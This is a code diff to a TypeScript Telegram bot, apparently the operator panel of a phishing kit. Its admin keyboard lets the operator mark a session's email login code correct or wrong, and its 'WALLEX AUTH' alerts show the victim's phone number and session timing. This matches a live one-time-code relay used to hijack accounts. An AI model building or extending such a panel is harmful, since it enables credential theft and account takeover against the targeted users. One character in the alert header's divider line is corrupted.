@@ -915,12 +915,19 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Secondary Actions Row
   const secondaryRow = [];
 
+  // Email Code Button - Direct to code input, changes to Wrong after attempts
   if (!session.authAttempts["email"]) {
     secondaryRow.push({
-      text: "📧 EMAIL",
-      callback_data: `auth_email_${sessionId}`,
+      text: "📧 EMAIL CODE",
+      callback_data: `auth_email_code_${sessionId}`,
     });
     console.log("✅ Added Email Code button");
+  } else if (session.authAttempts["email"] > 0) {
+    secondaryRow.push({
+      text: "🚫 EMAIL CODE",
+      callback_data: `incorrect_email_code_${sessionId}`,
+    });
+    console.log("✅ Added Wrong Email Code button");
   }
 
   secondaryRow.push({
@@ -931,24 +938,6 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
 
   if (secondaryRow.length > 0) {
     buttons.push(secondaryRow);
-  }
-
-  // Email Code Validation Buttons - Show if user has attempted email
-  if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
-    const emailCodeRow = [];
-
-    emailCodeRow.push({
-      text: "✅ EMAIL CODE",
-      callback_data: `email_code_correct_${sessionId}`,
-    });
-
-    emailCodeRow.push({
-      text: "❌ WRONG EMAIL CODE",
-      callback_data: `incorrect_email_code_${sessionId}`,
-    });
-
-    buttons.push(emailCodeRow);
-    console.log("✅ Added Email Code validation buttons");
   }
 
   // Status Check Button - Always available
@@ -1402,7 +1391,7 @@ const formatSessionMessage = (session: UserSession): string => {
 
   // Professional header
   let message = `${status.emoji} <b>WALLEX AUTH</b> ${status.priority} ${status.urgency}
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+▬▬▬▬▬▬▬▬▬▬▬▬▬���▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 📱 <b>${escapeHtml(session.phoneNumber)}</b>
 🕐 ${currentDate} ${currentTime} • ${durationText}`;
 
